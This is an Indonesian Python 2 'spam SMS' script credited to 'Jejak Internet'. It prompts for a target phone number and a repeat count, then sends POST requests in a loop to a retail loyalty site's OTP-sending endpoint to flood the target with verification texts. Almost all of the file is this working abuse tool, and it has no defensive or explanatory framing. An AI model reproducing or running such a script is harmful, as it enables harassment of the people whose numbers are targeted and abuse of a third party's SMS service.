#coding: utf-8

# HARAP JANGAN RECODE !!

# HARGAIN PEMBUAT SCRIPT !!

import requests, os, time, sys

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.010)

        

def balik():

    print ''

    print '\x1b[94m[\x1b[92m\xe2\x80\xa2\xe2\x80\xa2\x1b[94m] \x1b[97mDone Broo...'

    mmk = raw_input('\x1b[94m[\x1b[91m\xe2\x80\xa2\xe2\x80\xa2\x1b[94m] \x1b[97mBack To Spam ? ')

    if mmk == '':

        main()

    else:

        sys.exit()

        

def main():  

    os.system('figlet spam sms')

    print'[92m================================='

    print'[97m Author : [96mJejak Internet '

    print'[97m YouTube   : [96mJejak Internet '

    print'[92m================================='

    print'[97m Script Spam Sms Terbaru Dari Jejak Internet '

    print '\x1b[94m{\x1b[91m\xe2\x80\xa2\x1b[91m\xc3\x97\x1b[94m} \x1b[97mContoh : 08xxxxx'

    no = raw_input('\x1b[94m{\x1b[92m\xe2\x80\xa2\xe2\x80\xa2\x1b[94m} \x1b[97mTarget : \x1b[95m')

    jum = raw_input('\x1b[94m{\x1b[92m\xe2\x80\xa2\xe2\x80\xa2\x1b[94m} \x1b[97mJumlah : \x1b[95m')

    print '\x1b[92m+\x1b[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[92m+'

    print '\x1b[94m{\x1b[91m\xc3\x97\x1b[91m\xe2\x80\xa2\x1b[94m} \x1b[97mStatus : '

    print ''

    url = 'https://www.lpoint.co.id/app/member/ESYMBRJOTPSEND.do'

    head = {'UserAgent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36'}

    data = {'pn': '', 

       'bird': '', 

       'webMbrId': '', 

       'webPwd': '', 

       'maFemDvC': '', 

       'cellNo': no, 

       'otpNo': '', 

       'seq': '', 

       'otpChk': 'N', 

       'count': ''}

    for x in range(int(jum)):

        r = requests.post(url, headers=head, data=data)

        if 'error' in r.text:

            print '\x1b[94m[\x1b[91m!\x1b[94m] \x1b[97mSpam Sms To \x1b[91m' + no + ' \x1b[97mGagal Silahkan Coba Lagi Nanti'

        else:

            print '\x1b[94m[\x1b[92m\xe2\x9c\x93\x1b[94m] \x1b[97mSpam Sms To \x1b[92m' + no + ' \x1b[97m\x1b[101mSubscribe Jejak Internet\x1b[0m \x1b[92mSuccses'

main()

balik()
